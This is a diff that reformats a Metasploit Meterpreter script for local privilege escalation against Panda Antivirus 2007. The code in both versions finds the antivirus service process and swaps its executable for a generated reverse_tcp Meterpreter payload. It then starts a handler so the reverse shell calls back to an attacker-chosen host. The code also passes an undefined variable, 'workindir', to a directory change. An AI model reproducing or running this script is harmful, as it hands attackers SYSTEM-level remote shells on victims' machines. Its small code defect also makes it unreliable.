@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
@@ -10,8 +11,6 @@
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
-
 
 ##
 # Panda Antivirus 2007 Local Privilege Escalation
@@ -49,65 +48,63 @@ end
 #
 # Option parsing
 #
-@exec_opts.parse(args) do |opt, idx, val|
+@exec_opts.parse(args) do |opt, _idx, val|
   case opt
-    when "-r"
-      rhost = val
-    when "-p"
-      rport = val.to_i
-    else
-      usage
+  when "-r"
+    rhost = val
+  when "-p"
+    rport = val.to_i
+  else
+    usage
     end
 end
 
-if rhost.nil? or rport.nil?
+if rhost.nil? || rport.nil?
   usage
 elsif client.platform =~ /win32|win64/
-  client.sys.process.get_processes().each do |m|
+  client.sys.process.get_processes.each do |m|
+    next unless m['name'] =~ /PAVSRV51\.EXE/
+    print_status("Found vulnerable process #{m['name']} with pid #{m['pid']}.")
 
-    if ( m['name'] =~ /PAVSRV51\.EXE/ )
-      print_status("Found vulnerable process #{m['name']} with pid #{m['pid']}.")
+    # Build out the exe payload.
+    pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
+    pay.datastore['LHOST'] = rhost
+    pay.datastore['LPORT'] = rport
+    raw = pay.generate
 
-      # Build out the exe payload.
-      pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
-      pay.datastore['LHOST'] = rhost
-      pay.datastore['LPORT'] = rport
-      raw  = pay.generate
+    exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
 
-      exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
+    # Change to our working directory.
+    workingdir = client.sys.config.getenv('ProgramFiles') + "\\Panda Software\\Panda Antivirus 2007\\"
+    client.fs.dir.chdir(workindir)
 
-      # Change to our working directory.
-      workingdir = client.sys.config.getenv('ProgramFiles') + "\\Panda Software\\Panda Antivirus 2007\\"
-      client.fs.dir.chdir(workindir)
+    # Create a backup of the original exe.
+    print_status("Creating a copy of PAVSRV51 (PAVSRV51_back.EXE)...")
+    client.sys.process.execute("cmd.exe /c rename PAVSRV51.EXE PAVSRV51_back.EXE", nil, 'Hidden' => 'true')
 
-      # Create a backup of the original exe.
-      print_status("Creating a copy of PAVSRV51 (PAVSRV51_back.EXE)...")
-      client.sys.process.execute("cmd.exe /c rename PAVSRV51.EXE PAVSRV51_back.EXE", nil, {'Hidden' => 'true'})
+    # Place our newly created exe with the orginal binary name.
+    tempexe = workingdir + "PAVSRV51.EXE"
 
-      # Place our newly created exe with the orginal binary name.
-      tempexe = workingdir + "PAVSRV51.EXE"
+    print_status("Sending EXE payload '#{tempexe}'.")
+    fd = client.fs.file.new(tempexe, "wb")
+    fd.write(exe)
+    fd.close
 
-      print_status("Sending EXE payload '#{tempexe}'.")
-      fd = client.fs.file.new(tempexe, "wb")
-      fd.write(exe)
-      fd.close
+    print_status("Done, now just wait for the callback...")
 
-      print_status("Done, now just wait for the callback...")
+    # Our handler to recieve the callback.
+    handler = client.framework.exploits.create("multi/handler")
+    handler.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
+    handler.datastore['LHOST']   = rhost
+    handler.datastore['LPORT']   = rport
+    # Keep our shell stable.
+    handler.datastore['InitialAutoRunScript'] = "migrate -f"
+    handler.datastore['ExitOnSession'] = false
 
-      # Our handler to recieve the callback.
-      handler = client.framework.exploits.create("multi/handler")
-      handler.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
-      handler.datastore['LHOST']   = rhost
-      handler.datastore['LPORT']   = rport
-      # Keep our shell stable.
-      handler.datastore['InitialAutoRunScript'] = "migrate -f"
-      handler.datastore['ExitOnSession'] = false
-
-      handler.exploit_simple(
-        'Payload'        => handler.datastore['PAYLOAD'],
-        'RunAsJob'       => true
-      )
-    end
+    handler.exploit_simple(
+      'Payload'        => handler.datastore['PAYLOAD'],
+      'RunAsJob'       => true
+    )
   end
 else
   print_error("This version of Meterpreter is not supported with this script!")
